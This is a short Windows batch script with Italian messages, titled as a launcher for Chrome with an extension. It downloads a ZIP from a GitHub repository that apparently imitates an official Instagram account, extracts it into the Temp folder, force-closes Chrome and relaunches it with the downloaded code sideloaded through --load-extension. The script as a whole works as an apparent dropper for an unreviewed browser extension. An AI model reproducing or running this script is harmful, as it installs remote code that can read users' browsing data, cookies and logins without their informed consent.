@echo off
setlocal enabledelayedexpansion

echo === Script avvio Chrome con estensione ===
echo.

REM Imposta percorsi
set "EXTENSION_DIR=%USERPROFILE%\AppData\Local\Temp\mia_estensione"
set "ZIP_FILE=%USERPROFILE%\AppData\Local\Temp\extension.zip"

REM Scarica l'estensione
echo [1/4] Download estensione...
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/insta-official/Lupoumberto/raw/refs/heads/main/extension.zip.zip' -OutFile '%ZIP_FILE%'"

if not exist "%ZIP_FILE%" (
    echo ERRORE: Download fallito
    pause
    exit /b 1
)

REM Elimina directory esistente se presente
if exist "%EXTENSION_DIR%" (
    echo [2/4] Rimuovo vecchia estensione...
    rmdir /s /q "%EXTENSION_DIR%"
)

REM Estrai il file ZIP
echo [3/4] Estraggo estensione...
powershell -Command "Expand-Archive -Path '%ZIP_FILE%' -DestinationPath '%EXTENSION_DIR%' -Force"

if not exist "%EXTENSION_DIR%" (
    echo ERRORE: Estrazione fallita
    pause
    exit /b 1
)

REM Uccidi Chrome e riavvia
echo [4/4] Riavvio Chrome con estensione...
taskkill /IM chrome.exe /F 2>nul
timeout /t 1 /nobreak >nul

REM Avvia Chrome con estensione
start chrome.exe --load-extension="%EXTENSION_DIR%"

echo.
echo === Fatto! Chrome avviato con estensione ===
timeout /t 2 >nul
exit /b 0
